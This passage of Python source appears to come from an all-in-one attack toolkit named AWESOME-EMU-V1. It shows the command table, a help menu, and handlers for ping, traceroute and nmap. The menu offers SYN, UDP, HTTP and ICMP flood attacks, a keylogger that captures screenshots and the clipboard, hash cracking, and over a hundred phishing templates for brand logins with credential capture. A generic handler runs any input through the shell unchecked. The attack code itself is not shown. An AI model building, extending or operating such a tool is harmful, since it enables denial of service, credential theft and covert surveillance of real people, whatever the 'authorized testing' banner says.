            'wget_dns_timeout': self._wget_dns_timeout,
            'wget_connect_timeout': self._wget_connect_timeout,
            'wget_read_timeout': self._wget_read_timeout,
            'wget_inet4': self._wget_inet4,
            'wget_inet6': self._wget_inet6,
            'wget_prefer_family': self._wget_prefer_family,
            'wget_bind_address': self._wget_bind_address,
            'wget_no_dns_cache': self._wget_no_dns_cache,
            'wget_no_http_keep_alive': self._wget_no_http_keep_alive,
            'wget_no_cache': self._wget_no_cache,
            'wget_no_cookies': self._wget_no_cookies,
            'wget_load_cookies': self._wget_load_cookies,
            'wget_keep_session_cookies': self._wget_keep_session_cookies,
            'wget_help': self._wget_help,
            'wget_version': self._wget_version,
            
            # Network tools
            'netcat': self._netcat,
            'nc': self._netcat,
            'whois': self._whois,
            'dig': self._dig,
            'nslookup': self._nslookup,
            'dns': self._dns,
            'location': self._location,
            'ip_info': self._ip_info,
            
            # SSH commands
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            
            # Traffic generation
            'traffic': self._traffic,
            'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop,
            'traffic_status': self._traffic_status,
            
            # DOS attacks
            'dos_syn': self._dos_syn,
            'dos_udp': self._dos_udp,
            'dos_http': self._dos_http,
            'dos_icmp': self._dos_icmp,
            'dos_stop': self._dos_stop,
            'dos_status': self._dos_status,
            
            # Keylogger
            'keylogger_start': self._keylogger_start,
            'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status,
            'keylogger_logs': self._keylogger_logs,
            'keylogger_screenshots': self._keylogger_screenshots,
            'keylogger_clipboard': self._keylogger_clipboard,
            
            # Cracking
            'crack': self._crack,
            'crack_status': self._crack_status,
            'crack_list': self._crack_list,
            'crack_md5': self._crack_md5,
            'crack_sha1': self._crack_sha1,
            'crack_sha256': self._crack_sha256,
            'crack_ntlm': self._crack_ntlm,
            
            # Docker
            'docker_scan': self._docker_scan,
            'docker_info': self._docker_info,
            'docker_ps': self._docker_ps,
            'docker_images': self._docker_images,
            
            # IP management
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            
            # Social engineering
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            'phish_list': self._phish_list,
        }
        
        # Add all phishing templates
        for template_name in self.social.templates.keys():
            commands[f'phish_{template_name}'] = lambda _, t=template_name: self._phish(t)
        
        return commands
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        """Execute a command"""
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
        else:
            result = self._generic(command)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    def _generic(self, command: str) -> Dict:
        """Execute generic command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    # System commands
    def _help(self, args: List[str]) -> Dict:
        """Show help"""
        help_text = f"""
{Colors.BRIGHT_WHITE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.BRIGHT_WHITE}        🦅 AWESOME-EMU-V1 v{VERSION} - HELP MENU                           {Colors.BRIGHT_WHITE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.BRIGHT_CYAN}📡 PING COMMANDS (20+):{Colors.RESET}
║  ping <target> [count]         - Basic ping
║  ping_count <target> <count>   - Ping with count
║  ping_flood <target>           - Ping flood
║  ping_size <target> <size>     - Ping with packet size
║  ping_interval <target> <sec>  - Ping with interval
║  ping_timeout <target> <sec>   - Ping with timeout
║  ping_ttl <target> <ttl>       - Ping with TTL
║  ping_interface <t> <iface>    - Ping with interface
║  ping_source <t> <ip>          - Ping with source IP
║  ping_pattern <t> <pattern>    - Ping with pattern
║  ping_record <target>          - Record route
║  ping_timestamp <target>       - Timestamps
║  ping_quiet <target>           - Quiet ping
║  ping_verbose <target>         - Verbose ping
║  ping_ipv6 <target>            - IPv6 ping
║  ping_sweep <network>          - Ping sweep
║  fping <targets...>            - Fast ping
║  ping_mtu <t> <size>           - MTU discovery
║  ping_deadline <t> <sec>       - Deadline ping
║  ping_numeric <target>         - Numeric output
║  ping_adaptive <target>        - Adaptive ping
║  ping_audible <target>         - Audible ping
║
║{Colors.BRIGHT_CYAN}🗺️ TRACEROUTE COMMANDS (25+):{Colors.RESET}
║  traceroute <target>           - Basic traceroute
║  tracert <target>              - Windows traceroute
║  tracepath <target>            - Tracepath
║  traceroute_tcp <target>       - TCP traceroute
║  traceroute_udp <target>       - UDP traceroute
║  traceroute_icmp <target>      - ICMP traceroute
║  traceroute_max_hops <t> <n>   - Max hops
║  traceroute_first_hop <t> <n>  - First hop
║  traceroute_queries <t> <n>    - Queries per hop
║  traceroute_wait <t> <sec>     - Wait time
║  traceroute_port <t> <port>    - Port
║  traceroute_numeric <target>   - Numeric output
║  traceroute_verbose <target>   - Verbose
║  mtr <target>                  - MTR
║  mtr_json <target>             - MTR JSON
║  mtr_csv <target>              - MTR CSV
║  tcptraceroute <target>        - TCP traceroute
║  traceroute_ipv6 <target>      - IPv6 traceroute
║
║{Colors.BRIGHT_CYAN}🔍 NMAP COMMANDS (60+):{Colors.RESET}
║  nmap <target> [type]          - Basic nmap
║  nmap_quick <target>           - Quick scan
║  nmap_full <target>            - Full scan
║  nmap_service <target>         - Service detection
║  nmap_os <target>              - OS detection
║  nmap_udp <target>             - UDP scan
║  nmap_vuln <target>            - Vulnerability scan
║  nmap_stealth <target>         - Stealth scan
║  nmap_aggressive <target>      - Aggressive scan
║  nmap_comprehensive <target>   - Comprehensive scan
║  nmap_ping <target>            - Ping scan
║  nmap_ports <t> <ports>        - Port range
║  nmap_script <t> <script>      - NSE script
║  nmap_output <t> <file>        - Output file
║  nmap_exclude <t> <hosts>      - Exclude hosts
║  nmap_input <file>             - Input file
║  nmap_random <count>           - Random targets
║  nmap_timing <t> <level>       - Timing
║  nmap_traceroute <target>      - Traceroute
║  nmap_version                  - Version
║  nmap_help                     - Help
║  nmap_syn <target>             - SYN scan
║  nmap_connect <target>         - Connect scan
║  nmap_ack <target>             - ACK scan
║  nmap_fin <target>             - FIN scan
║  nmap_xmas <target>            - XMAS scan
║  nmap_null <target>            - NULL scan
║  nmap_script_default <target>  - Default scripts
║  nmap_top_ports <t> <count>    - Top ports
║  nmap_open <target>            - Open ports only
║  nmap_reason <target>          - Show reasons
║  nmap_packet_trace <target>    - Packet trace
║  nmap_iflist                   - List interfaces
║  nmap_no_ping <target>         - Skip discovery
║  nmap_fast <target>            - Fast scan
║  nmap_fragment <target>        - Fragment
║  nmap_decoys <t> <count>       - Decoys
║  nmap_source_port <t> <port>   - Source port
║  nmap_data_length <t> <len>    - Data length
║  nmap_ttl <t> <ttl>            - Set TTL
║  nmap_spoof_mac <t> <mac>      - Spoof MAC
║  nmap_badsum <target>          - Bad checksum
║  nmap_send_eth <target>        - Send ethernet
║  nmap_send_ip <target>         - Send IP
║
║{Colors.BRIGHT_CYAN}🌐 CURL COMMANDS (60+):{Colors.RESET}
║  curl <url>                    - Basic request
║  curl_get <url>                - GET request
║  curl_post <url> <data>        - POST request
║  curl_put <url> <data>         - PUT request
║  curl_delete <url>             - DELETE request
║  curl_patch <url> <data>       - PATCH request
║  curl_head <url>               - HEAD request
║  curl_options <url>            - OPTIONS request
║  curl_output <url> <file>      - Output file
║  curl_remote_name <url>        - Remote name
║  curl_location <url>           - Follow redirects
║  curl_include <url>            - Include headers
║  curl_verbose <url>            - Verbose
║  curl_silent <url>             - Silent
║  curl_show_error <url>         - Show errors
║  curl_fail <url>               - Fail on error
║  curl_insecure <url>           - Skip SSL
║  curl_data <url> <data>        - POST data
║  curl_data_binary <u> <file>   - Binary data
║  curl_data_urlencode <u> <d>   - URL encode
║  curl_form <url> <field> <val> - Form data
║  curl_header <url> <header>    - Custom header
║  curl_user_agent <url> <ua>    - User agent
║  curl_referer <url> <referer>  - Referer
║  curl_user <url> <user:pass>   - Basic auth
║  curl_cookie <url> <cookie>    - Cookie
║  curl_cookie_jar <u> <file>    - Cookie jar
║  curl_proxy <url> <proxy>      - Proxy
║  curl_cert <url> <cert>        - Client cert
║  curl_key <url> <key>          - Private key
║  curl_cacert <url> <ca>        - CA cert
║  curl_tlsv1_2 <url>            - TLS 1.2
║  curl_tlsv1_3 <url>            - TLS 1.3
║  curl_continue <url>           - Resume
║  curl_range <url> <range>      - Range
║  curl_limit_rate <u> <rate>    - Limit rate
║  curl_max_time <u> <sec>       - Max time
║  curl_connect_timeout <u> <s>  - Connect timeout
║  curl_retry <url> <count>      - Retry
║  curl_ipv4 <url>               - IPv4
║  curl_ipv6 <url>               - IPv6
║  curl_interface <u> <iface>    - Interface
║  curl_http2 <url>              - HTTP/2
║  curl_compressed <url>         - Compressed
║  curl_write_out <u> <format>   - Write out
║  curl_dump_header <u> <file>   - Dump headers
║  curl_trace <url> <file>       - Trace
║  curl_json <url> <json>        - JSON POST
║  curl_help                     - Help
║  curl_version                  - Version
║  curl_parallel <url1> <url2>   - Parallel
║  curl_config <file>            - Config file
║  curl_next <url1> <url2>       - Multiple URLs
║  curl_styled <url>             - Styled output
║  curl_progress <url>           - Progress bar
║
║{Colors.BRIGHT_CYAN}⬇️ WGET COMMANDS (50+):{Colors.RESET}
║  wget <url> [output]           - Basic download
║  wget_output <url> <file>      - Output file
║  wget_continue <url>           - Resume
║  wget_background <url>         - Background
║  wget_quiet <url>              - Quiet
║  wget_recursive <url>          - Recursive
║  wget_mirror <url>             - Mirror
║  wget_spider <url>             - Spider
║  wget_input <file>             - Input file
║  wget_header <url> <header>    - Custom header
║  wget_user_agent <url> <ua>    - User agent
║  wget_referer <url> <referer>  - Referer
║  wget_cookies <url> <file>     - Load cookies
║  wget_save_cookies <u> <file>  - Save cookies
║  wget_limit_rate <u> <rate>    - Limit rate
║  wget_timeout <url> <sec>      - Timeout
║  wget_tries <url> <count>      - Retries
║  wget_retry <url>              - Retry
║  wget_no_check_cert <url>      - Skip SSL
║  wget_certificate <u> <cert>   - Certificate
║  wget_private_key <u> <key>    - Private key
║  wget_ca_certificate <u> <ca>  - CA cert
║  wget_proxy <url> <proxy>      - Proxy
║  wget_no_proxy <url>           - No proxy
║  wget_user <url> <user>        - User
║  wget_password <url> <pass>    - Password
║  wget_post_data <url> <data>   - POST data
║  wget_post_file <url> <file>   - POST file
║  wget_method <url> <method>    - Method
║  wget_timestamping <url>       - Timestamping
║  wget_no_clobber <url>         - No clobber
║  wget_delete_after <url>       - Delete after
║  wget_progress <url>           - Progress bar
║  wget_show_progress <url>      - Show progress
║  wget_config <file>            - Config file
║  wget_append_output <u> <file> - Append log
║  wget_output_file <u> <file>   - Output log
║  wget_no_parent <url>          - No parent
║  wget_cut_dirs <url> <count>   - Cut dirs
║  wget_directory_prefix <u> <d> - Dir prefix
║  wget_convert_links <url>      - Convert links
║  wget_backup_converted <url>   - Backup
║  wget_adjust_extension <url>   - Adjust ext
║  wget_restrict_file_names <u>  - Restrict names
║  wget_trust_server_names <u>   - Trust names
║  wget_content_disposition <u>  - Content disp
║  wget_random_wait <url>        - Random wait
║  wget_wait <url> <sec>         - Wait
║  wget_waitretry <url> <sec>    - Wait retry
║  wget_quota <url> <quota>      - Quota
║  wget_dns_timeout <u> <sec>    - DNS timeout
║  wget_connect_timeout <u> <s>  - Connect timeout
║  wget_read_timeout <url> <sec> - Read timeout
║  wget_inet4 <url>              - IPv4 only
║  wget_inet6 <url>              - IPv6 only
║  wget_prefer_family <u> <fam>  - Prefer family
║  wget_bind_address <u> <addr>  - Bind address
║  wget_no_dns_cache <url>       - No DNS cache
║  wget_no_http_keep_alive <u>   - No keepalive
║  wget_no_cache <url>           - No cache
║  wget_no_cookies <url>         - No cookies
║  wget_load_cookies <u> <file>  - Load cookies
║  wget_keep_session_cookies <u> <f> - Keep session
║  wget_help                     - Help
║  wget_version                  - Version
║
║{Colors.BRIGHT_CYAN}🔌 NETWORK COMMANDS:{Colors.RESET}
║  netcat <host> <port> [cmd]    - Netcat
║  nc <host> <port> [cmd]        - Netcat alias
║  whois <domain>                - WHOIS
║  dig <domain>                  - DNS lookup
║  nslookup <domain>             - NSLookup
║  dns <domain> [type]           - DNS query
║  location <ip>                 - Geolocation
║  ip_info <ip>                  - IP information
║
║{Colors.BRIGHT_CYAN}🔒 SSH COMMANDS:{Colors.RESET}
║  ssh_add <name> <host> <user> [pass] - Add SSH
║  ssh_list                      - List SSH
║  ssh_connect <conn_id>         - Connect
║  ssh_exec <conn_id> <command>  - Execute
║  ssh_disconnect <conn_id>      - Disconnect
║
║{Colors.BRIGHT_CYAN}🚀 TRAFFIC GENERATION:{Colors.RESET}
║  traffic <type> <ip> <duration> [port] [rate] - Generate
║  traffic_types                 - List types
║  traffic_stop [id]             - Stop
║  traffic_status                - Status
║
║{Colors.BRIGHT_CYAN}💥 DOS ATTACKS:{Colors.RESET}
║  dos_syn <ip> <port> <duration> [threads] - SYN flood
║  dos_udp <ip> <port> <duration> [threads] - UDP flood
║  dos_http <ip> <port> <duration> [threads] - HTTP flood
║  dos_icmp <ip> <duration> [threads] - ICMP flood
║  dos_stop [id]                - Stop attack
║  dos_status                    - Status
║
║{Colors.BRIGHT_CYAN}⌨️ KEYLOGGER:{Colors.RESET}
║  keylogger_start               - Start (F10 to stop)
║  keylogger_stop                - Stop
║  keylogger_status              - Status
║  keylogger_logs [limit]        - View logs
║  keylogger_screenshots         - View screenshots
║  keylogger_clipboard [limit]   - View clipboard
║
║{Colors.BRIGHT_CYAN}🔓 CRACKING:{Colors.RESET}
║  crack <type> <hash> [wordlist] - Start cracking
║  crack_status <job_id>         - Check status
║  crack_list                    - List jobs
║  crack_md5 <hash>              - Crack MD5
║  crack_sha1 <hash>             - Crack SHA1
║  crack_sha256 <hash>           - Crack SHA256
║  crack_ntlm <hash>             - Crack NTLM
║
║{Colors.BRIGHT_CYAN}🐳 DOCKER:{Colors.RESET}
║  docker_scan <image>           - Scan image
║  docker_info                   - Docker info
║  docker_ps                     - List containers
║  docker_images                 - List images
║
║{Colors.BRIGHT_CYAN}🔒 IP MANAGEMENT:{Colors.RESET}
║  add_ip <ip> [notes]           - Add IP
║  remove_ip <ip>                - Remove IP
║  block_ip <ip> [reason]        - Block IP
║  unblock_ip <ip>               - Unblock IP
║  list_ips [active]             - List IPs
║
║{Colors.BRIGHT_CYAN}🎣 SOCIAL ENGINEERING (100+ Templates):{Colors.RESET}
║  phish_facebook                - Facebook phishing
║  phish_instagram               - Instagram phishing
║  phish_twitter                 - Twitter phishing
║  phish_gmail                   - Gmail phishing
║  phish_linkedin                - LinkedIn phishing
║  phish_microsoft               - Microsoft phishing
║  phish_google                  - Google phishing
║  phish_apple                   - Apple phishing
║  phish_paypal                  - PayPal phishing
║  phish_amazon                  - Amazon phishing
║  phish_netflix                 - Netflix phishing
║  phish_spotify                 - Spotify phishing
║  phish_steam                   - Steam phishing
║  phish_discord                 - Discord phishing
║  ... and 90+ more templates
║  phish_start <link_id> [port]  - Start server
║  phish_stop                    - Stop server
║  phish_creds [link_id]         - View credentials
║  phish_list                    - List links
║
║{Colors.BRIGHT_CYAN}📊 SYSTEM:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System info
║  threats [limit]               - Recent threats
║  clear                         - Clear screen
║  version                       - Version
║  help                          - This help
║
║{Colors.BRIGHT_WHITE}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}
    
    def _status(self, args: List[str]) -> Dict:
        """Show system status"""
        stats = self.db.get_statistics()
        output = f"""
{Colors.BRIGHT_CYAN}🦅 AWESOME-EMU-V1 System Status{Colors.RESET}
{'='*50}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  DOS Attacks: {stats.get('total_dos_attacks', 0)}
  Docker Scans: {stats.get('total_docker_scans', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {NetworkTools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict:
        """Show command history"""
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args: List[str]) -> Dict:
        """Show system information"""
        output = f"""
💻 System Information
{'='*40}
OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args: List[str]) -> Dict:
        """Show recent threats"""
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            severity = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"  {severity} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _clear(self, args: List[str]) -> Dict:
        """Clear screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _version(self, args: List[str]) -> Dict:
        """Show version"""
        return {'success': True, 'output': f"AWESOME-EMU-V1 v{VERSION}\nAuthor: {AUTHOR}\n{TOTAL_LINES}+ lines of code"}
    
    # Ping commands
    def _ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = PingCommands.basic(target)
        return {'success': result.success, 'output': result.output}
    
    def _ping_count(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_count <target> <count>'}
        result = PingCommands.count(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _ping_flood(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_flood <target>'}
        result = PingCommands.flood(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _ping_size(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_size <target> <size>'}
        result = PingCommands.size(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _ping_interval(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_interval <target> <interval>'}
        result = PingCommands.interval(args[0], float(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _ping_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_timeout <target> <timeout>'}
        result = PingCommands.timeout(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _ping_ttl(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_ttl <target> <ttl>'}
        result = PingCommands.ttl(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _ping_interface(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_interface <target> <interface>'}
        result = PingCommands.interface(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _ping_source(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_source <target> <source_ip>'}
        result = PingCommands.source(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _ping_pattern(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_pattern <target> <pattern>'}
        result = PingCommands.pattern(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _ping_record(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_record <target>'}
        result = PingCommands.record_route(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _ping_timestamp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_timestamp <target>'}
        result = PingCommands.timestamp(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _ping_quiet(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_quiet <target>'}
        result = PingCommands.quiet(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _ping_verbose(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_verbose <target>'}
        result = PingCommands.verbose(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _ping_ipv6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_ipv6 <target>'}
        result = PingCommands.ipv6(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _ping_sweep(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_sweep <network>'}
        result = PingCommands.sweep(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _fping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: fping <targets...>'}
        result = PingCommands.fping(args)
        return {'success': result.success, 'output': result.output}
    
    def _ping_mtu(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_mtu <target> <size>'}
        result = PingCommands.mtu(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _ping_deadline(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_deadline <target> <seconds>'}
        result = PingCommands.deadline(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _ping_numeric(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_numeric <target>'}
        result = PingCommands.numeric(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _ping_adaptive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_adaptive <target>'}
        result = PingCommands.adaptive(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _ping_audible(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_audible <target>'}
        result = PingCommands.audible(args[0])
        return {'success': result.success, 'output': result.output}
    
    # Traceroute commands
    def _traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        result = TracerouteCommands.basic(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _tracepath(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: tracepath <target>'}
        result = self._generic(f'tracepath {args[0]}')
        return result
    
    def _traceroute_tcp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_tcp <target>'}
        result = TracerouteCommands.tcp(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _traceroute_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_udp <target>'}
        result = TracerouteCommands.udp(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _traceroute_icmp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_icmp <target>'}
        result = TracerouteCommands.icmp(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _traceroute_max_hops(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_max_hops <target> <hops>'}
        result = TracerouteCommands.max_hops(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _traceroute_first_hop(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_first_hop <target> <hop>'}
        result = TracerouteCommands.first_hop(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _traceroute_queries(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_queries <target> <queries>'}
        result = TracerouteCommands.queries(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _traceroute_wait(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_wait <target> <seconds>'}
        result = TracerouteCommands.wait(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _traceroute_port(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_port <target> <port>'}
        result = TracerouteCommands.port(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _traceroute_numeric(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_numeric <target>'}
        result = TracerouteCommands.numeric(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _traceroute_verbose(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_verbose <target>'}
        result = TracerouteCommands.verbose(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _mtr(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr <target>'}
        result = TracerouteCommands.mtr(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _mtr_json(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr_json <target>'}
        result = TracerouteCommands.mtr_json(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _mtr_csv(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr_csv <target>'}
        result = TracerouteCommands.mtr_csv(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _tcptraceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: tcptraceroute <target>'}
        result = TracerouteCommands.tcptraceroute(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _traceroute_ipv6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_ipv6 <target>'}
        result = TracerouteCommands.ipv6(args[0])
        return {'success': result.success, 'output': result.output}
    
    # Nmap commands
    def _nmap(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [type]'}
        target = args[0]
        scan_type = args[1] if len(args) > 1 else 'quick'
        result = NmapCommands.basic(target)
        return {'success': result.success, 'output': result.output}
    
    def _nmap_quick(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_quick <target>'}
        result = NmapCommands.quick(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_full(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_full <target>'}
        result = NmapCommands.full(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_service(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_service <target>'}
        result = NmapCommands.service(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_os(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_os <target>'}
        result = NmapCommands.os_detection(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_udp <target>'}
        result = NmapCommands.udp(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_vuln(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_vuln <target>'}
        result = NmapCommands.vuln(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_stealth(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_stealth <target>'}
        result = NmapCommands.stealth(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_aggressive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_aggressive <target>'}
        result = NmapCommands.aggressive(args[0])
        return {'success': result.success, 'output': result.output}
    
